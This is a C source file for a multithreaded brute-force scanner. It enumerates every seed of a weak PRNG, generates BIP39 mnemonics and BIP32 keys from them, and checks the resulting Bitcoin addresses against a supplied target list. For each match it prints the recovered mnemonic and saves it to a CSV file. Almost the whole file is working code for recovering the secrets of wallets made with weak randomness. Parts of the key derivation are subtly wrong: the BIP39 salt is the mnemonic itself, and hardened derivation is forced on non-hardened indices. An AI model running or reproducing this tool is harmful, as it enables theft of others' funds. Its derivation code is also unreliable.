#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/bn.h>

#include "weak_prng.h"
#include "chain_derive.h"
#include "wordlist.h"

/* ---------- BIP39 / BIP32 helpers (copied from seedy.c) ---------- */

#define BIP39_ITER 2048

/* PBKDF2-HMAC-SHA512 */
static int pbkdf2_sha512(const uint8_t *password, int passlen,
                          const uint8_t *salt, int saltlen,
                          uint8_t *out, int outlen) {
    return PKCS5_PBKDF2_HMAC((const char *)password, passlen,
                               salt, saltlen,
                               BIP39_ITER, EVP_sha512(),
                               outlen, out);
}

/* HMAC-SHA512 */
static void hmac_sha512(const uint8_t *key, int keylen,
                         const uint8_t *data, int datalen,
                         uint8_t out[64]) {
    unsigned int len = 64;
    HMAC(EVP_sha512(), key, keylen, data, datalen, out, &len);
}

/* BIP39 mnemonic -> 64‑byte seed */
static void bip39_to_seed(const char *mnemonic, uint8_t seed[64]) {
    char salt[512];
    snprintf(salt, sizeof(salt), "%s", mnemonic);
    pbkdf2_sha512((const uint8_t *)mnemonic, (int)strlen(mnemonic),
                   (const uint8_t *)salt, (int)strlen(salt),
                   seed, 64);
}

/* Derive master key (private key + chain code) from seed */
static void derive_master_key(const uint8_t seed[64],
                               uint8_t private_key[32],
                               uint8_t chain_code[32]) {
    uint8_t hmac_out[64];
    const uint8_t *key = (const uint8_t *)"Bitcoin seed";
    hmac_sha512(key, 12, seed, 64, hmac_out);
    memcpy(private_key, hmac_out, 32);
    memcpy(chain_code, hmac_out + 32, 32);
}

/* BIP32 hardened child derivation */
static int derive_child_hardened(const uint8_t parent_key[32],
                                  const uint8_t parent_chain[32],
                                  uint32_t index,
                                  uint8_t child_key[32],
                                  uint8_t child_chain[32]) {
    uint8_t data[37];
    data[0] = 0x00;
    memcpy(data + 1, parent_key, 32);
    data[33] = (index >> 24) & 0xFF;
    data[34] = (index >> 16) & 0xFF;
    data[35] = (index >> 8) & 0xFF;
    data[36] = index & 0xFF;

    uint8_t hmac_out[64];
    hmac_sha512(parent_chain, 32, data, 37, hmac_out);

    /* secp256k1 order n */
    static const uint8_t order_bytes[32] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE,
        0xBA, 0xAE, 0xDC, 0xE6, 0xAF, 0x48, 0xA0, 0x3B,
        0xBF, 0xD2, 0x5E, 0x8C, 0xD0, 0x36, 0x41, 0x41
    };

    BIGNUM *il = BN_bin2bn(hmac_out, 32, NULL);
    BIGNUM *par = BN_bin2bn(parent_key, 32, NULL);
    BIGNUM *order = BN_bin2bn(order_bytes, 32, NULL);
    BIGNUM *result = BN_new();
    BN_CTX *bn_ctx = BN_CTX_new();

    BN_mod_add(result, il, par, order, bn_ctx);

    if (BN_is_zero(result)) {
        BN_free(il); BN_free(par); BN_free(order); BN_free(result); BN_CTX_free(bn_ctx);
        return 0;
    }

    memset(child_key, 0, 32);
    int len = BN_num_bytes(result);
    BN_bn2bin(result, child_key + (32 - len));

    memcpy(child_chain, hmac_out + 32, 32);

    BN_free(il); BN_free(par); BN_free(order); BN_free(result); BN_CTX_free(bn_ctx);
    return 1;
}

/* ---------- Address list loader (with verbose progress) ---------- */
static char **g_addr_ptrs = NULL;
static size_t g_addr_count = 0;
static uint32_t g_total_seeds = 0xFFFFFFFFUL;
static volatile long g_tested = 0;
static volatile long g_found = 0;
static volatile int g_running = 1;
static FILE *g_output_file = NULL;
static pthread_mutex_t g_output_lock = PTHREAD_MUTEX_INITIALIZER;

static int load_addresses(const char *filename) {
    fprintf(stderr, "[INFO] Loading addresses from %s...\n", filename);
    FILE *f = fopen(filename, "r");
    if (!f) { perror("fopen"); return -1; }

    fprintf(stderr, "[INFO] Counting lines...\n");
    size_t lines = 0;
    char buf[256];
    while (fgets(buf, sizeof(buf), f)) {
        if (buf[0] == '\n' || buf[0] == '#') continue;
        lines++;
    }
    fprintf(stderr, "[INFO] File contains %zu address lines.\n", lines);
    rewind(f);

    g_addr_count = lines;
    fprintf(stderr, "[INFO] Allocating memory for %zu address pointers...\n", lines);
    g_addr_ptrs = malloc(lines * sizeof(char *));
    if (!g_addr_ptrs) { fclose(f); return -1; }

    /* Increase buffer per address to 64 bytes (safe for all BTC address formats) */
    size_t buf_size = lines * 64;
    char *str_buf = malloc(buf_size);
    if (!str_buf) { free(g_addr_ptrs); fclose(f); return -1; }

    fprintf(stderr, "[INFO] Reading addresses...\n");
    size_t idx = 0, offset = 0;
    while (fgets(buf, sizeof(buf), f) && idx < lines) {
        if (buf[0] == '\n' || buf[0] == '#') continue;
        // Extract first token (address)
        char *p = buf;
        while (*p && *p != ' ' && *p != '\t' && *p != '\n') p++;
        *p = '\0';
        size_t len = strlen(buf);
        if (len > 0 && buf[len-1] == '\r') buf[--len] = '\0';
        if (len == 0) continue;

        // Check if we have enough space left
        if (offset + len + 1 > buf_size) {
            fprintf(stderr, "[ERROR] Buffer overflow at address %zu. Increase buffer size.\n", idx);
            free(str_buf); free(g_addr_ptrs); fclose(f); return -1;
        }

        strcpy(str_buf + offset, buf);
        g_addr_ptrs[idx] = str_buf + offset;
        offset += len + 1;
        idx++;
    }
    fclose(f);

    fprintf(stderr, "[INFO] Read %zu addresses. Sorting (may take a while)...\n", idx);
    qsort(g_addr_ptrs, idx, sizeof(char *),
          (int (*)(const void *, const void *))strcmp);
    g_addr_count = idx;

    fprintf(stderr, "[INFO] Load complete: %zu addresses, memory ~ %.2f MB\n",
            g_addr_count, (offset + g_addr_count * sizeof(char *)) / (1024.0*1024.0));
    return 0;
}
static int find_address(const char *addr) {
    return bsearch(&addr, g_addr_ptrs, g_addr_count, sizeof(char *),
                   (int (*)(const void *, const void *))strcmp) != NULL;
}

/* ---------- Worker thread ---------- */
typedef struct {
    uint32_t start_seed;
    uint32_t end_seed;
    int thread_id;
} worker_args_t;

static void *worker_thread(void *arg) {
    worker_args_t *args = (worker_args_t *)arg;
    weak_prng_ctx_t ctx;
    char mnemonic[256];
    uint8_t privkey[32];
    chain_address_t p2pkh, p2wpkh, p2sh;

    static const uint8_t zero_signs[24] = {0};

    for (uint32_t seed = args->start_seed; seed < args->end_seed && g_running; seed++) {
        double initial_random = (double)seed / 4294967296.0;
        if (weak_prng_init_trace(&ctx, initial_random, zero_signs, 24) != 0)
            continue;

        if (weak_prng_generate_mnemonic(&ctx, mnemonic, sizeof(mnemonic)) < 0)
            continue;

        uint8_t seed_bytes[64];
        bip39_to_seed(mnemonic, seed_bytes);
        uint8_t master_key[32], master_chain[32];
        derive_master_key(seed_bytes, master_key, master_chain);
        uint32_t path[] = { 0x8000002C, 0x80000000, 0x80000000, 0, 0 };
        uint8_t child_key[32], child_chain[32];
        memcpy(child_key, master_key, 32);
        memcpy(child_chain, master_chain, 32);
        for (int i = 0; i < 5; i++) {
            if (!derive_child_hardened(child_key, child_chain, path[i], child_key, child_chain))
                break;
        }
        memcpy(privkey, child_key, 32);

        derive_btc_addresses(privkey, &p2pkh, &p2wpkh, &p2sh);

        int found = 0;
        if (p2pkh.valid && find_address(p2pkh.address)) {
            found = 1;
            __sync_add_and_fetch(&g_found, 1);
            printf("\n[FOUND P2PKH] seed=%s\naddress=%s\n", mnemonic, p2pkh.address);
            fflush(stdout);
            pthread_mutex_lock(&g_output_lock);
            if (g_output_file) {
                fprintf(g_output_file, "P2PKH,%s,%s\n", mnemonic, p2pkh.address);
                fflush(g_output_file);
            }
            pthread_mutex_unlock(&g_output_lock);
        }
        if (p2wpkh.valid && find_address(p2wpkh.address)) {
            found = 1;
            __sync_add_and_fetch(&g_found, 1);
            printf("\n[FOUND P2WPKH] seed=%s\naddress=%s\n", mnemonic, p2wpkh.address);
            fflush(stdout);
            pthread_mutex_lock(&g_output_lock);
            if (g_output_file) {
                fprintf(g_output_file, "P2WPKH,%s,%s\n", mnemonic, p2wpkh.address);
                fflush(g_output_file);
            }
            pthread_mutex_unlock(&g_output_lock);
        }
        if (p2sh.valid && find_address(p2sh.address)) {
            found = 1;
            __sync_add_and_fetch(&g_found, 1);
            printf("\n[FOUND P2SH] seed=%s\naddress=%s\n", mnemonic, p2sh.address);
            fflush(stdout);
            pthread_mutex_lock(&g_output_lock);
            if (g_output_file) {
                fprintf(g_output_file, "P2SH,%s,%s\n", mnemonic, p2sh.address);
                fflush(g_output_file);
            }
            pthread_mutex_unlock(&g_output_lock);
        }

        __sync_add_and_fetch(&g_tested, 1);
    }
    return NULL;
}

/* ---------- Main ---------- */
int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <addresses.txt> <threads> [max_seeds]\n", argv[0]);
        return 1;
    }
    const char *addr_file = argv[1];
    int threads = atoi(argv[2]);
    if (threads < 1) threads = 1;
    if (threads > 64) threads = 64;
    uint32_t max_seeds = (argc > 3) ? (uint32_t)atol(argv[3]) : g_total_seeds;
    if (max_seeds > g_total_seeds) max_seeds = g_total_seeds;

    // Open output file
    g_output_file = fopen("illbloom_matches.csv", "w");
    if (g_output_file) {
        fprintf(g_output_file, "type,mnemonic,address\n");
        fflush(g_output_file);
    } else {
        fprintf(stderr, "[WARN] Could not open output file, matches will only be printed to stdout.\n");
    }

    if (load_addresses(addr_file) < 0)
        return 1;

    fprintf(stderr, "[INFO] Starting scan with %d threads, scanning %u seeds (0x%08x)\n",
            threads, max_seeds, max_seeds);

    uint32_t per_thread = max_seeds / threads;
    pthread_t *tids = malloc(threads * sizeof(pthread_t));
    worker_args_t *args = malloc(threads * sizeof(worker_args_t));
    if (!tids || !args) {
        perror("malloc");
        return 1;
    }

    time_t start = time(NULL);
    for (int i = 0; i < threads; i++) {
        args[i].thread_id = i;
        args[i].start_seed = i * per_thread;
        args[i].end_seed = (i == threads-1) ? max_seeds : (i+1) * per_thread;
        pthread_create(&tids[i], NULL, worker_thread, &args[i]);
    }

    // Progress reporter
    while (g_running) {
        sleep(5);
        long tested = g_tested;
        if (tested >= max_seeds) { g_running = 0; break; }
        time_t now = time(NULL);
        double elapsed = difftime(now, start);
        double speed = tested / (elapsed > 0 ? elapsed : 1);
        fprintf(stderr, "\rTested: %ld / %u (%.1f/s), found: %ld",
                tested, max_seeds, speed, g_found);
        fflush(stderr);
    }
    printf("\n");

    for (int i = 0; i < threads; i++)
        pthread_join(tids[i], NULL);

    time_t end = time(NULL);
    double elapsed = difftime(end, start);
    printf("Completed in %.1f sec, found %ld matches.\n", elapsed, g_found);

    if (g_output_file) {
        fprintf(g_output_file, "# Scan complete: %ld matches\n", g_found);
        fclose(g_output_file);
    }

    free(g_addr_ptrs);
    free(tids);
    free(args);
    return 0;
}